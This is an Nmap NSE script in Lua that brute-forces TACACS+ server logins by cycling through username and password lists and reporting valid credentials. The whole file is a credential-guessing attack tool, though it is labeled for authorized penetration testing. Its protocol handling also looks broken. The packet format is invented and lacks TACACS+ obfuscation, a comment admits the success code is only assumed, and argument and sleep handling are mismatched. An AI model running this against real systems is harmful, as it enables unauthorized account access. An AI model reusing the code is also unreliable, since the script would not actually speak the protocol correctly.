-- Script Name: tacacs-brute.nse
-- Purpose: Performs brute-force login attempts on a TACACS+ server using provided username and password lists.
-- Author: Your Name
-- License: Same as Nmap

-- Import necessary libraries
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local creds = require "creds"

-- Define the description of the script
description = [[
Attempts to brute-force TACACS+ server logins using username and password combinations from provided dictionaries.
The script includes options for rate limiting to avoid lockouts and is designed for authorized penetration testing.
]]

-- Define categories
categories = {"auth", "intrusive"}

-- Define portrule to target TACACS+ servers
portrule = shortport.port_or_service(49, "tacacs")

-- Default rate limiting and dictionary options
local DEFAULT_RATE_LIMIT = 100 -- Milliseconds between attempts
local DEFAULT_USERLIST = {"admin", "user", "test", "guest"}
local DEFAULT_PASSLIST = {"password", "admin", "1234", "guest"}

-- Function to construct a TACACS+ authentication packet
local function create_tacacs_auth_packet(username, password)
  -- TACACS+ header:
  -- 1 byte: version (major << 4 | minor)
  -- 1 byte: type (0x01 for authentication START)
  -- 1 byte: sequence (should start at 1)
  -- 1 byte: flags (set to 0 for this packet)
  -- 4 bytes: session ID (random value)
  -- 4 bytes: length of the packet body

  local version = "\xc0" -- TACACS+ version 1.0
  local packet_type = "\x01" -- Authentication START
  local sequence = "\x01" -- Sequence number 1
  local flags = "\x00" -- No flags
  local session_id = stdnse.generate_random_bytes(4)

  -- Packet body: username and password attributes
  local username_attr = "\x01" .. string.char(#username) .. username
  local password_attr = "\x02" .. string.char(#password) .. password
  local body = username_attr .. password_attr
  local length = string.pack("!I4", #body)

  return version .. packet_type .. sequence .. flags .. session_id .. length .. body
end

-- Function to send the TACACS+ authentication packet and analyze the response
local function attempt_tacacs_login(host, port, username, password)
  local socket = nmap.new_socket()
  socket:set_timeout(5000) -- 5-second timeout

  local packet = create_tacacs_auth_packet(username, password)

  local status, err = socket:connect(host, port)
  if not status then
    return nil, string.format("Failed to connect to TACACS+ server: %s", err)
  end

  local sent, err = socket:send(packet)
  if not sent then
    socket:close()
    return nil, string.format("Failed to send TACACS+ packet: %s", err)
  end

  local response, err = socket:receive()
  socket:close()

  if not response then
    return nil, string.format("No response from TACACS+ server: %s", err)
  end

  -- Analyze response for authentication success (example: assume 0x03 indicates success)
  local response_code = string.byte(response, 2)
  if response_code == 0x03 then
    return true
  else
    return false
  end
end

-- Main action function
action = function(host, port)
  local usernames = stdnse.get_script_args("tacacs-brute.userlist") or DEFAULT_USERLIST
  local passwords = stdnse.get_script_args("tacacs-brute.passlist") or DEFAULT_PASSLIST
  local rate_limit = tonumber(stdnse.get_script_args("tacacs-brute.rate_limit")) or DEFAULT_RATE_LIMIT

  local results = {}

  for _, username in ipairs(usernames) do
    for _, password in ipairs(passwords) do
      stdnse.print_debug(1, "Trying username: %s with password: %s", username, password)

      local success, err = attempt_tacacs_login(host, port, username, password)

      if success then
        table.insert(results, string.format("Valid credentials found: %s/%s", username, password))
      elseif err then
        stdnse.print_debug(1, "Error attempting login for %s/%s: %s", username, password, err)
      end

      stdnse.sleep(rate_limit)
    end
  end

  if #results > 0 then
    return table.concat(results, "\n")
  else
    return "No valid credentials found."
  end
end
